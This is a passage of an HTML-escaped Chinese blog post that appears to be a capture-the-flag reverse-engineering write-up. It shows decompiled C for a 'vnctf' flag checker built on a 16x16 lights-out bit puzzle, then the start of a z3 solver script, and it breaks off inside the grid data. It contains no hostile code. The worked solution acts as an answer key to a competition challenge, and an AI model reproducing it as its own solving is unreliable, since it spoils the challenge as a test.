            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
          }
          v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v7 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;7&amp;#39;&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
        {
          v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v7 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;;
        }
        dword_403398 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
        v14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1;
      }
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF&lt;/span&gt; )               &lt;span style=&#34;color:#75715e&#34;&gt;// 不能大于F
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v5 )                                 &lt;span style=&#34;color:#75715e&#34;&gt;// 奇数时，两位两位进行计算
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;      {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( dword_403018 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)(v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v2) )&lt;span style=&#34;color:#75715e&#34;&gt;// 0FFFFFFFF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        dword_403018 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v2;            &lt;span style=&#34;color:#75715e&#34;&gt;// v1为列，v2为行
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
        {
          v9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; dword_40212C[v8];           &lt;span style=&#34;color:#75715e&#34;&gt;// -1  0  0  0  1 先输入的数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;          v10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; dword_402140[v8];          &lt;span style=&#34;color:#75715e&#34;&gt;//  0  0 -1  1  0 后输入的数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v9 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; v10 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF&lt;/span&gt; )
            final_check[v10] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; v9); &lt;span style=&#34;color:#75715e&#34;&gt;// 将所选位置及周围一圈的数字都进行取反，位置用大写十六进制表示
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;          v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v14;
          &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v8;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( v8 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; );
      }
      v0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v13 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
      v13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v0;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;inputstring[v0] )
        &lt;span style=&#34;color:#66d9ef&#34;&gt;goto&lt;/span&gt; LABEL_25;
    }
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
  {
LABEL_25:
    v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; final_check;                          &lt;span style=&#34;color:#75715e&#34;&gt;// 目标：均为-1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v11 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; )
    {
      &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v11;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)v11 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_40303C )
      {
        sub_401020(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;right, vnctf{MD5(%s)}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
      }
    }
  }
  sub_401020(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wrong&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;脚本求解&#34;&gt;脚本求解&lt;/h3&gt;
&lt;p&gt;简单的说就是已知一个 $16\times 16$ 的 $01$ 方阵，每次对一个格子取反，都会对相邻的四个格子同样进行取反，最终求解一个操作顺序使得所有的数字为 $1$。&lt;/p&gt;
&lt;p&gt;一开始写了个回溯，然后直接炸了。&lt;/p&gt;
&lt;p&gt;经过队友的提醒开始用z3求解（&lt;del&gt;队友的z3还是从我这里学的。。。&lt;/del&gt;），但没想到踩到了好多坑，也学会了一些z3的新用法。&lt;/p&gt;
&lt;p&gt;直接上最后的代码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; z3 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

init_check &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
    [&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span 